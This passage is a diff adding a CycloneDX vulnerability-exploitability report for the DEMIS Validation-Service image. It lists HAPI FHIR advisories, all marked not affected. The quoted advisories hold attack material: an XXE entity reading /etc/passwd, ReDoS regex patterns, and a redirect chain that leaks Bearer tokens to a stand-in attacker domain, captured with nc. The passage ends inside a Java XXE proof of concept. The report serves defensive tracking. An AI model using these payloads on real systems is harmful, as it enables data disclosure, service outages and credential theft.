@@ -1,0 +1,568 @@
+{
+  "bomFormat" : "CycloneDX",
+  "specVersion" : "1.5",
+  "serialNumber" : "urn:uuid:808a246f-4ac5-4707-a385-e6a36cfbc854",
+  "version" : 1,
+  "metadata" : {
+    "timestamp" : "2026-08-13T11:03:16Z",
+    "tools" : [
+      {
+        "vendor" : "OWASP",
+        "name" : "Dependency-Track",
+        "version" : "4.14.2-gematik-15"
+      }
+    ],
+    "component" : {
+      "type" : "container",
+      "bom-ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364",
+      "name" : "DEMIS Validation-Service (Docker Image)",
+      "version" : "2.16.0 (Main)"
+    }
+  },
+  "vulnerabilities" : [
+    {
+      "bom-ref" : "0264cb33-a714-4a8c-b0f0-ea2f8c4dff74",
+      "id" : "GHSA-4cf2-cxp3-rjr7",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.8,
+          "severity" : "critical",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.8,
+          "severity" : "high",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "cwes" : [
+        601,
+        611
+      ],
+      "description" : "An XML External Entity (XXE) vulnerability in HAPI FHIR before v6.4.0 allows attackers to access sensitive information or execute arbitrary code via supplying a crafted request containing malicious XML entities.",
+      "published" : "2024-11-05T18:32:11Z",
+      "updated" : "2024-11-06T23:38:38Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "818931df-219a-4598-b409-067a6b9cb51a",
+      "id" : "GHSA-p7m9-v2cm-2h7m",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.8,
+          "severity" : "critical",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+        }
+      ],
+      "cwes" : [
+        200
+      ],
+      "description" : "### Impact\nWhen setting headers in HTTP requests, the internal HTTP client sends headers first to the host in the initial URL but also, if asked to follow redirects and a 30X HTTP response code is returned, to the host mentioned in URL in the Location: response header value.\n\nSending the same set of headers to subsequent hosts is a problem as this header often contains privacy sensitive information or data that could allow others to impersonate the  client's request.\n\n### Patches\nThis issue has been patched in release 6.8.3 \n\n### Workarounds\nNone.",
+      "published" : "2026-03-18T20:07:49Z",
+      "updated" : "2026-03-25T18:12:02Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "bab8e0dd-a074-4c77-b8a3-948b3f2e60ca",
+      "id" : "GHSA-fxj4-p9xp-37v5",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        1333
+      ],
+      "description" : "## Summary\nThe fix for CVE-2026-45367 added `RegexTimeout` protection to the `matches()` function in DSTU2016MAY, DSTU3, R4, R4B, and R5, but the DSTU2 module was incompletely patched. In `org.hl7.fhir.dstu2`, `replaceMatches()` was updated while `matches()` at line 2462 still calls the raw `String.matches(sw)` without any timeout, allowing an unauthenticated attacker to trigger catastrophic regex backtracking and exhaust server CPU.\n\n\n## Details\n### Incomplete patch\n\nWithin the same file\n(`org.hl7.fhir.dstu2/utils/FHIRPathEngine.java`), the two functions were\npatched inconsistently:\n\n**Line 2226 — replaceMatches() — PATCHED:**\n```java\nresult.add(new StringType(\n    RegexTimeout.replaceAll(\n        convertToString(focus.get(0)), regex, repl, regexTimeoutMillis)));\n```\n\n**Line 2462 — matches() — NOT PATCHED:**\n```java\nresult.add(new BooleanType(\n    convertToString(focus.get(0)).matches(sw)));\n// ↑ raw String.matches() — no RegexTimeout, no complexity check\n```\n\n**DSTU3 line 2447 — matches() — PATCHED (for comparison):**\n```java\nresult.add(new BooleanType(\n    RegexTimeout.matches(st, sw, regexTimeoutMillis)));\n```\n\n### Module-by-module status\n\n| Module | `matches()` | `replaceMatches()` |\n|---|---|---|\n| **DSTU2** | ❌ raw `str.matches(sw)` | ✅ `RegexTimeout.replaceAll()` |\n| DSTU2016MAY | ✅ `RegexTimeout.matches()` | ✅ |\n| DSTU3 | ✅ `RegexTimeout.matches()` | ✅ |\n| R4 | ✅ `RegexTimeout.matches()` | ✅ |\n| R4B | ✅ `RegexTimeout.matches()` | ✅ |\n| R5 | ✅ `RegexTimeout.matches()` | ✅ |\n\n\n## PoC\n**Requirements:** Java 17+, Maven 3.8+\n\n**pom.xml dependencies:**\n```xml\n<dependency>\n    <groupId>ca.uhn.hapi.fhir</groupId>\n    <artifactId>org.hl7.fhir.utilities</artifactId>\n    <version>6.9.7</version>\n</dependency>\n```\n\n**Test code (reproduces the exact behaviour of DSTU2 line 2462):**\n```java\nimport org.hl7.fhir.utilities.regex.RegexTimeout;\nimport java.util.concurrent.*;\n\nString regex = \"((a|b){0,5}){20}\";\nString input = \"a\".repeat(25) + \"c\";    // no match → full backtracking\n\n// ① Patched approach — RegexTimeout terminates at 500 ms\nlong t1 = System.currentTimeMillis();\ntry {\n    RegexTimeout.matches(input, regex, 500);\n} catch (TimeoutException e) {\n    System.out.println(\"RegexTimeout blocked in \" +\n        (System.currentTimeMillis() - t1) + \" ms\");\n}\n\n// ② DSTU2 line 2462 — raw String.matches(), no timeout\nlong t2 = System.currentTimeMillis();\ninput.matches(regex);                   // equivalent to what FHIRPathEngine does\nSystem.out.println(\"str.matches() ran for \" +\n    (System.currentTimeMillis() - t2) + \" ms with no timeout\");\n```\n\n**Verified output (JDK 25.0.3, Linux):**\n```\nRegexTimeout blocked in 508 ms      ← patched modules: attack stopped\nstr.matches() ran for 1410 ms       ← DSTU2: no timeout, CPU exhausted\n```\n\nThe patched approach cuts off the evaluation at 508 ms. The unpatched DSTU2\ncode runs for 1410 ms on this input with no mechanism to stop it. Longer\ninputs or more complex patterns produce proportionally worse results.\n\n\n## Impact\n**Vulnerability type:** Regular Expression Denial of Service (ReDoS) causing CPU exhaustion and service disruption.\n\n**Who is impacted:** Any application using the `ca.uhn.hapi.fhir:org.hl7.fhir.dstu2` module that evaluates user-supplied FHIRPath expressions — including the FHIR Validator HTTP endpoint, FHIR servers applying FHIRPath invariants from user-provided resources or profiles, and any system embedding `FHIRPathEngine` from the DSTU2 module. No authentication is required; an attacker needs only to submit a FHIR resource or FHIRPath expression whose `matches()` argument contains a catastrophically backtracking regular expression.",
+      "published" : "2026-06-17T18:47:23Z",
+      "updated" : "2026-06-17T18:47:23Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "We don't use the FHIRPath Function in this service."
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "b80e37b1-60f2-46ee-8302-840bb11ccb8c",
+      "id" : "GHSA-3653-68v6-rq57",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        1333
+      ],
+      "description" : "## Summary\n\nAll implementations of FHIRPathEngine accept arbitrary FHIRPath expressions and evaluate them without input validation. The FHIRPath functions `matches()`, `matchesFull()`, and `replaceMatches()` pass user-controlled regular expressions directly to Java's `Pattern.compile()` and `String.replaceAll()` without complexity checks or timeouts. An attacker can send a resource containing an evil regex pattern that causes catastrophic backtracking, exhausting system resources, and causing Denial-of-Service.\n\n## Details\n\nThe vulnerability exists in regex execution in FHIRPathEngine implementations across multiple code modules. For example the org.hl7.fhir.r5 module:\n\n\n**Entry point 1 — `FHIRPathEngine.java:5929` (R5 `funcMatches`):**\n```java\nprivate List<Base> funcMatches(ExecutionContext context, List<Base> focus, ExpressionNode exp) {\n    String sw = convertToString(swb); // attacker-controlled regex pattern\n    // ...\n    Pattern p = Pattern.compile(\"(?s)\" + sw); // VULNERABLE: no complexity check\n    Matcher m = p.matcher(st);                // no timeout\n    boolean ok = m.find();\n```\n\n**Entry point 2 — `FHIRPathEngine.java:5951` (R5 `funcMatchesFull`):**\n```java\nPattern p = Pattern.compile(\"(?s)\" + sw); // VULNERABLE: same pattern\nMatcher m = p.matcher(st);\nboolean ok = m.matches();\n```\n\n**Entry point 3 — `FHIRPathEngine.java:5120` (R5 `funcReplaceMatches`):**\n```java\nresult.add(new StringType(convertToString(focus.get(0))\n    .replaceAll(regex, repl)).noExtensions()); // VULNERABLE: replaceAll uses Pattern internally\n```\n\nThe same vulnerabilities exist in the dstu2, dstu2016may, dstu3, r4, and r4b modules, and the FHIRPathEngine is used in the validation module functionality.\n\n**Why this is exploitable:**\n- No timeout mechanism covers FHIRPath evaluation — the `ValidationTimeout` class only protects `InstanceValidator` operations, not `evaluateFhirPath()`\n- Java's `Pattern.compile()` with a pattern like `(a+)+$` against input `\"aaaaaaaaaaaaaaaaaaaaaa!\"` causes exponential backtracking (O(2^n) time complexity)\n\n\n## Impact\n\n- **CPU Exhaustion:** The exponential backtracking in Java's regex engine consumes 100% of a CPU core for the duration of the hang (effectively infinite for sufficiently long input strings) for callers of FHIRPathEngine.",
+      "published" : "2026-05-18T20:23:54Z",
+      "updated" : "2026-05-18T20:23:55Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "We don't use the FHIRPath Function in this service."
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "bf746035-1649-424c-9bb3-0a139ad6edfe",
+      "id" : "GHSA-7cmj-v6x8-frvv",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.5,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "cwes" : [
+        400,
+        1333
+      ],
+      "description" : "# Summary\nAll implementations of FHIRPathEngine accept arbitrary FHIRPath expressions and evaluate them without input validation. The utility intended to secure this evaluation did so incorrectly, and did not fully cover all places in which evaluation was being done. An attacker can send a resource containing an evil regex pattern that causes catastrophic backtracking, exhausting system resources, and causing Denial-of-Service.\n\n## Details\nThe vulnerability exists in regex execution in FHIRPathEngine implementations across multiple code modules. The FHIRPath functions matches(), matchesFull(), and replaceMatches() pass user-controlled regular expressions to Java's Pattern.compile() and String.replaceAll() through a utility class designed to time out after a specified interval. That utility correctly cancelled a single executor thread and returned with an exception, but the execution within the thread had no means to listen for this cancellation and would persist. Furthermore, three modules contained method calls in FHIRPathEngine that were not protected by this utility class.\n\n## Why this is exploitable:\n\nJava's Pattern.compile() with a pattern like (a+)+$ against input \"aaaaaaaaaaaaaaaaaaaaaa!\" causes exponential backtracking (O(2^n) time complexity). \n\n## Impact\nCPU Exhaustion: The exponential backtracking in Java's regex engine consumes 100% of a CPU core for the duration of the hang (effectively infinite for sufficiently long input strings) for callers of FHIRPathEngine.",
+      "published" : "2026-07-09T13:43:03Z",
+      "updated" : "2026-07-09T13:43:04Z",
+      "analysis" : {
+        "state" : "not_affected",
+        "justification" : "code_not_reachable",
+        "detail" : "FHIRPath is not used in this service."
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "08b36fa1-afd8-4e88-a5b4-1c0c419a9bc6",
+      "id" : "GHSA-6cr6-ph3p-f5rf",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.6,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+        },
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.7,
+          "severity" : "high",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        611
+      ],
+      "description" : "### Impact\nXSLT transforms performed by various components are vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag ( `<!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/passwd\"> ]>` could produce XML containing data from the host system. This impacts use cases where org.hl7.fhir.core is being used to within a host where external clients can submit XML.\n\n### Patches\nThis issue has been patched in release 6.3.23\n\n### Workarounds\nNone.\n\n### References\n[MITRE CWE](https://cwe.mitre.org/data/definitions/611.html)\n[OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory)\n",
+      "published" : "2024-09-06T19:45:27Z",
+      "updated" : "2024-09-07T08:36:45Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7e210272-6611-46db-b359-aca3980b39d8",
+      "id" : "GHSA-gr3c-q7xf-47vh",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 8.6,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+        },
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.7,
+          "severity" : "high",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        611
+      ],
+      "description" : "### Summary\nXSLT parsing performed by various components are vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag ( <!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/passwd\"> ]> could produce XML containing data from the host system. This impacts use cases where org.hl7.fhir.core is being used to within a host where external clients can submit XML.\n\n### Details\nThis is related to https://github.com/hapifhir/org.hl7.fhir.core/security/advisories/GHSA-6cr6-ph3p-f5rf, in which its fix ( https://github.com/hapifhir/org.hl7.fhir.core/issues/1571, https://github.com/hapifhir/org.hl7.fhir.core/pull/1717) was incomplete. \n\n### References\nhttps://cwe.mitre.org/data/definitions/611.html\nhttps://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j",
+      "published" : "2024-11-08T18:49:15Z",
+      "updated" : "2024-11-12T19:23:19Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "7e29c070-faa1-4777-9ee2-6c4d9e6f4ed4",
+      "id" : "GHSA-fgv2-4q4g-wc35",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 7.4,
+          "severity" : "high",
+          "method" : "CVSSv31",
+          "vector" : "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "cwes" : [
+        346
+      ],
+      "description" : "## Summary\n\n`ManagedWebAccessUtils.getServer()` uses `String.startsWith()` to match request URLs against configured server URLs for authentication credential dispatch. Because configured server URLs (e.g., `http://tx.fhir.org`) lack a trailing slash or host boundary check, an attacker-controlled domain like `http://tx.fhir.org.attacker.com` matches the prefix and receives Bearer tokens, Basic auth credentials, or API keys when the HTTP client follows a redirect to that domain.\n\n## Details\n\nThe root cause is in `ManagedWebAccessUtils.getServer()` at `org.hl7.fhir.utilities/src/main/java/org/hl7/fhir/utilities/http/ManagedWebAccessUtils.java:26`:\n\n```java\npublic static ServerDetailsPOJO getServer(String url, Iterable<ServerDetailsPOJO> serverAuthDetails) {\n    if (serverAuthDetails != null) {\n      for (ServerDetailsPOJO serverDetails : serverAuthDetails) {\n          if (url.startsWith(serverDetails.getUrl())) {  // <-- no host boundary check\n            return serverDetails;\n          }\n      }\n    }\n    return null;\n}\n```\n\nThe configured production terminology server URL is defined without a trailing slash in `FhirSettingsPOJO.java:19`:\n\n```java\nprotected static final String TX_SERVER_PROD = \"http://tx.fhir.org\";\n```\n\nThis means:\n- `\"http://tx.fhir.org.attacker.com/capture\".startsWith(\"http://tx.fhir.org\")` → **true**\n- `\"http://tx.fhir.org:8080/evil\".startsWith(\"http://tx.fhir.org\")` → **true**\n\n**Exploit chain via SimpleHTTPClient (redirect path):**\n\n1. `SimpleHTTPClient.get()` (`SimpleHTTPClient.java:68-105`) makes a request to `http://tx.fhir.org/ValueSet/$expand`\n2. On each redirect, the loop calls `getHttpGetConnection(url, accept)` (line 84) → `setHeaders(connection)` (line 117)\n3. `setHeaders()` (line 122-133) calls `authProvider.canProvideHeaders(url)` and `authProvider.getHeaders(url)` on the **redirect target URL**\n4. `ServerDetailsPOJOHTTPAuthProvider.getServerDetails()` (line 83-84) delegates to `ManagedWebAccessUtils.getServer(url.toString(), servers)`\n5. The `startsWith()` check matches `http://tx.fhir.org.attacker.com` against `http://tx.fhir.org`\n6. Credentials are dispatched to the attacker's server via `ServerDetailsPOJOHTTPAuthProvider.getHeaders()` (lines 38-58):\n   - Bearer tokens: `Authorization: Bearer {token}`\n   - Basic auth: `Authorization: Basic {base64(user:pass)}`\n   - API keys: `Api-Key: {apikey}`\n   - Custom headers from server config\n\nNote: An earlier fix (commit `6b615880` \"Strip headers on redirect\") added an `isNotSameHost()` check, but this was **removed** in commit `3871cc69` (\"Rework authorization providers in ManagedWebAccess\"). The current code on master has no host validation during redirect following.\n\n**Exploit chain via ManagedFhirWebAccessor (OkHttp path):**\n\n`ManagedFhirWebAccessor.httpCall()` (line 81-112) sets auth headers via `requestWithAuthorizationHeaders()` before passing the request to OkHttpClient. OkHttpClient follows redirects by default (up to 20) and carries the pre-set auth headers to all redirect targets. The same `startsWith()` check in `canProvideHeaders()` applies.\n\nThe same vulnerable pattern also exists in `ManagedWebAccess.isLocal()` (line 214), where `url.startsWith(server.getUrl())` is used to determine whether HTTP (non-TLS) access is allowed, potentially enabling TLS downgrade for attacker-controlled domains that match the prefix.\n\n## PoC\n\n**Step 1: Verify the prefix match behavior**\n\n```java\n// This demonstrates the core vulnerability\nString configuredUrl = \"http://tx.fhir.org\";  // FhirSettingsPOJO.TX_SERVER_PROD\nString attackerUrl = \"http://tx.fhir.org.attacker.com/capture\";\n\nSystem.out.println(attackerUrl.startsWith(configuredUrl));\n// Output: true\n```\n\n**Step 2: Demonstrate credential dispatch to wrong host**\n\nGiven a `fhir-settings.json` configuration at `~/.fhir/fhir-settings.json`:\n```json\n{\n  \"servers\": [\n    {\n      \"url\": \"http://tx.fhir.org\",\n      \"authenticationType\": \"token\",\n      \"token\": \"secret-bearer-token-12345\"\n    }\n  ]\n}\n```\n\nWhen `SimpleHTTPClient.get(\"http://tx.fhir.org/ValueSet/$expand\")` follows a 302 redirect to `http://tx.fhir.org.attacker.com/capture`:\n\n1. `setHeaders()` is called with the redirect target URL\n2. `authProvider.canProvideHeaders(new URL(\"http://tx.fhir.org.attacker.com/capture\"))` returns `true`\n3. `authProvider.getHeaders(...)` returns `{\"Authorization\": \"Bearer secret-bearer-token-12345\"}`\n4. The `Authorization` header with the secret token is sent to `tx.fhir.org.attacker.com`\n\n**Step 3: Attacker captures the credential**\n\n```bash\n# On attacker-controlled server (tx.fhir.org.attacker.com)\nnc -l -p 80 | head -20\n# Output includes:\n# GET /capture HTTP/1.1\n# Host: tx.fhir.org.attacker.com\n# Authorization: Bearer secret-bearer-token-12345\n```\n\n## Impact\n\n- **Credential theft**: Bearer tokens, Basic authentication passwords, API keys, and custom authentication headers configured for FHIR terminology servers can be exfiltrated by an attacker who can inject a redirect (via MITM, compromised CDN, or DNS poisoning).\n- **Impersonation**: Stolen credentials allow an attacker to make authenticated requests to the legitimate FHIR server, potentially accessing or modifying clinical terminology data.\n- **Broad exposure**: The FHIR Validator is widely used in healthcare IT for validating FHIR resources. Any deployment that configures server authentication in `fhir-settings.json` and makes outbound HTTP requests to terminology servers is affected.\n- **TLS downgrade**: The same `startsWith()` pattern in `ManagedWebAccess.isLocal()` could allow an attacker-controlled domain to be treated as \"local,\" bypassing the HTTPS enforcement.\n\n## Recommended Fix\n\nReplace the `startsWith()` check in `ManagedWebAccessUtils.getServer()` with proper URL host boundary validation:\n\n```java\npublic static ServerDetailsPOJO getServer(String url, Iterable<ServerDetailsPOJO> serverAuthDetails) {\n    if (serverAuthDetails != null) {\n      for (ServerDetailsPOJO serverDetails : serverAuthDetails) {\n          if (urlMatchesServer(url, serverDetails.getUrl())) {\n            return serverDetails;\n          }\n      }\n    }\n    return null;\n}\n\n/**\n * Check if a URL matches a configured server URL with proper host boundary validation.\n * After the configured prefix, the next character must be '/', '?', '#', ':', or end-of-string.\n */\nprivate static boolean urlMatchesServer(String url, String serverUrl) {\n    if (url == null || serverUrl == null) return false;\n    if (!url.startsWith(serverUrl)) return false;\n    if (url.length() == serverUrl.length()) return true;\n    char nextChar = url.charAt(serverUrl.length());\n    return nextChar == '/' || nextChar == '?' || nextChar == '#' || nextChar == ':';\n}\n```\n\nApply the same fix to `ManagedWebAccess.isLocal()` at line 214 and the three-argument `getServer()` overload at line 14.\n\nAdditionally, consider re-introducing the host-equality check for redirects in `SimpleHTTPClient` (as was previously implemented in commit `6b615880` but removed in `3871cc69`) to provide defense-in-depth against credential leakage on cross-origin redirects.",
+      "published" : "2026-03-30T17:19:21Z",
+      "updated" : "2026-03-31T18:55:22Z",
+      "analysis" : {
+        "state" : "not_affected"
+      },
+      "affects" : [
+        {
+          "ref" : "7b2d0f96-afb0-4ec5-99f8-21d8b0083364"
+        }
+      ]
+    },
+    {
+      "bom-ref" : "4309d8af-e1c4-4b46-a02d-a4828b4c7265",
+      "id" : "GHSA-2f55-g35j-5jmf",
+      "source" : {
+        "name" : "GITHUB",
+        "url" : "https://github.com/advisories"
+      },
+      "ratings" : [
+        {
+          "source" : {
+            "name" : "GITHUB",
+            "url" : "https://github.com/advisories"
+          },
+          "score" : 9.2,
+          "severity" : "critical",
+          "method" : "CVSSv4",
+          "vector" : "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N"
+        }
+      ],
+      "cwes" : [
+        611
+      ],
+      "description" : "### Summary\n\n`org.hl7.fhir.utilities.XsltUtilities` exposes two parallel families of XSLT\ntransform helpers. The `transform(...)` overloads obtain their\n`TransformerFactory` from the project's hardened helper\n`XMLUtil.newXXEProtectedTransformerFactory()` (which sets\n`ACCESS_EXTERNAL_DTD=\"\"` and `ACCESS_EXTERNAL_STYLESHEET=\"\"`). The sibling\n`saxonTransform(...)` overloads instead instantiate a **bare**\n`new net.sf.saxon.TransformerFactoryImpl()` with no external-access\nrestriction. A document transformed through any `saxonTransform(...)` overload\nis parsed with external general entities and external DTD/parameter entities\nenabled, so an attacker who controls (or can MITM) the transformed XML obtains\nXML External Entity injection: local file disclosure and blind XXE / SSRF to\narbitrary URLs reachable from the host.\n\n`XMLUtil` documents that its protected factory \"should be the only place where\nTransformerFactory is instantiated in this project\". The `saxonTransform`\noverloads violate that contract while their same-file `transform` siblings\nhonour it.\n\n### Affected versions\n\n`org.hl7.fhir.utilities` (Maven `ca.uhn.hapi.fhir:org.hl7.fhir.utilities`)\n`<= 6.9.8` (latest release at time of report; verified live on `6.9.8`).\nThe bare `net.sf.saxon.TransformerFactoryImpl()` instantiation is present at\n`XsltUtilities.java:61`, `:91`, and `:106`.\n\n### Privilege required\n\nNone at the library boundary. The exposure depends on the calling tool: any\nFHIR component that runs `XsltUtilities.saxonTransform(...)` over XML whose\nsource document, embedded DTD, or referenced stylesheet is attacker-influenced\n(an IG package, a fetched/uploaded resource, a downloaded stylesheet, or a\nMITM'd HTTP fetch) triggers the XXE. No DOCTYPE/entity stripping occurs before\nthe Saxon parser sees the bytes.\n\n### Root cause\n\n`org.hl7.fhir.utilities/src/main/java/org/hl7/fhir/utilities/XsltUtilities.java`:\n\n```java\n// VULNERABLE — bare factory, no external-access restriction (lines 60-73, 90-99, 105-128)\npublic static byte[] saxonTransform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {\n    TransformerFactory f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare\n    f.setAttribute(\"http://saxon.sf.net/feature/version-warning\", Boolean.FALSE);\n    StreamSource xsrc = new StreamSource(new ByteArrayInputStream(xslt));\n    f.setURIResolver(new ZipURIResolver(files));\n    Transformer t = f.newTransformer(xsrc);\n    ...\n}\npublic static String saxonTransform(String source, String xslt) throws TransformerException, IOException {\n    TransformerFactoryImpl f = new net.sf.saxon.TransformerFactoryImpl();   // <-- bare\n    ...\n}\n\n// HARDENED SIBLING (same file, lines 75-88 / 130-149) — negative control\npublic static byte[] transform(Map<String, byte[]> files, byte[] source, byte[] xslt) throws TransformerException {\n    TransformerFactory f = org.hl7.fhir.utilities.xml.XMLUtil.newXXEProtectedTransformerFactory(); // <-- hardened\n    ...\n}\n```\n\nThe hardened helper (`XMLUtil.newXXEProtectedTransformerFactory()`) is:\n\n```java\npublic static TransformerFactory newXXEProtectedTransformerFactory() {\n    final TransformerFactory transformerFactory = TransformerFactory.newInstance();\n    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\n    transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\n    return transformerFactory;\n}\n```\n\nThe `saxonTransform` overloads never call this helper and never set the two\n`ACCESS_EXTERNAL_*` attributes, so the underlying parser resolves external\ngeneral entities (`<!ENTITY x SYSTEM \"file:///...\">`) and external\nDTD/parameter entities (`<!ENTITY % p SYSTEM \"http://attacker/\">`). This is a\nclassic CWE-611. The asymmetry — one family hardened, the co-located sibling\nfamily bare — is the bug: the protection that already exists in the same class\nwas not extended to the `saxonTransform` variants.\n\n### Reproduction (E2E against published Maven Central `org.hl7.fhir.utilities:6.9.8`)\n\nA self-contained Maven project. `pom.xml` pulls the latest released artifact,\nwhich transitively brings `net.sf.saxon:Saxon-HE:11.6`.\n\n`pom.xml`:\n\n```xml\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>poc</groupId><artifactId>fhir-xslt-xxe-poc</artifactId><version>1.0</version>\n  <properties>\n    <maven.compiler.source>17</maven.compiler.source>\n    <maven.compiler.target>17</maven.compiler.target>\n  </properties>\n  <dependencies>\n    <dependency>\n      <groupId>ca.uhn.hapi.fhir</groupId>\n      <artifactId>org.hl7.fhir.utilities</artifactId>\n      <version>6.9.8</version>\n    </dependency>\n  </dependencies>\n</project>\n```\n\n`src/main/java/Poc.java`:\n\n```java\nimport org.hl7.fhir.utilities.XsltUtilities;\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.*;\nimport java.util.*;\n\npublic class Poc {\n  static final String CANARY_MARK = \"TOP-SECRET-FHIR-XSLT-CANARY-3f9a17c2\";\n  // identity stylesheet: copies the resolved //data text into the output\n  static final String IDENTITY_XSLT =\n      \"<?xml version=\\\"1.0\\\"?>\\n\" +\n      \"<xsl:stylesheet version=\\\"1.0\\\" xmlns:xsl=\\\"http://www.w3.org/1999/XSL/Transform\\\">\\n\" +\n      \"  <xsl:output method=\\\"text\\\"/>\\n\" +\n      \"  <xsl:template match=\\\"/\\\"><xsl:value-of select=\\\"//data\\\"/></xsl:template>\\n\" +\n      \"</xsl:stylesheet>\\n\";\n\n  public static void main(String[] args) throws Exception {\n    Path secret = Files.createTempFile(\"fhir-secret-\", \".txt\");\n    